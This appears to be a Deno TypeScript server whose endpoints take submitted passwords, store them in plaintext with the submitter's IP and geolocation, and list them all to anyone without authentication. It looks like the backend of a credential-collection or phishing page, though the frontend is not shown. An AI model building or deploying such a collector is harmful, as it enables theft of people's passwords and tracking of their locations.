import { Application, Router, send } from "https://deno.land/x/oak/mod.ts";
import { DB } from "https://deno.land/x/sqlite/mod.ts";
import { Mutex } from "https://deno.land/x/mutex/mod.ts";
import { oakCors } from "https://deno.land/x/cors/mod.ts";

const dbLock = new Mutex();
const router = new Router();

const db = new DB("data.db");

db.query(`create table if not exists password (
  id integer primary key autoincrement,
  password text,
  ip text,
  city text,
  region text, 
  country text, 
  loc text,
  org text,
  timezone text,
  timestamp integer
)`);

router
  .get("/passwords", async ctx => {
    const rows: any[] = [];
    
    try {
      dbLock.lock();

      for(const row of db.query("select * from password")) {
        const [
          id,
          password,
          ip,
          city,
          region,
          country,
          loc,
          org,
          timezone,
          timestamp
        ] = row;

        const rowObj = {
          id: id,
          password: password,
          ip: ip,
          city: city,
          region: region,
          country: country,
          loc: loc,
          org: org,
          timezone: timezone,
          timestamp: timestamp
        };

        rows.push(rowObj);
      }
    } catch(e) {
      console.error(e);
    } finally {
      dbLock.unlock();  
    }
    
    ctx.response.body = rows.reverse();
  })
  .post("/passwords", async ctx => {
    const body = await ctx.request.body({ type: "json" }).value;
    console.log(body);
  
    try {
      dbLock.lock();

      const toInput = [
        body.input,
        body.ip,
        body.city,
        body.region,
        body.country,
        body.loc,
        body.org,
        body.timezone,
        new Date().getTime()
      ];

      await db.query("insert into password (password, ip, city, region, country, loc, org, timezone, timestamp) values (?, ?, ?, ?, ?, ?, ?, ?, ?)", toInput);
    } catch(e) {
      console.error(e);
    } finally {
      dbLock.unlock();
    }
  });

const app = new Application();
app.use(router.routes());
app.use(oakCors());
app.use(async ctx => {
  await send(ctx, ctx.request.url.pathname, {
    root: `${Deno.cwd()}/static`,
    index: "index.html"
  });
});

console.log("Access on http://localhost:8080");
await app.listen({ port: 8080 });
